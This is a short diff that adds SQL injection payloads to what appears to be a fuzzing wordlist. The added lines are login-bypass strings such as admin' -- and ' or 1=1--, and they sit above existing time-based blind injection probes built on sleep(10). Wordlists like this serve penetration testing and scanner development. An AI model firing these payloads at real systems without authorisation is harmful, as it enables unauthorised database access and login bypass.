@@ -1,3 +1,11 @@
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
 (sleep 10)--
 (sleep 10)
 (sleep(10))--
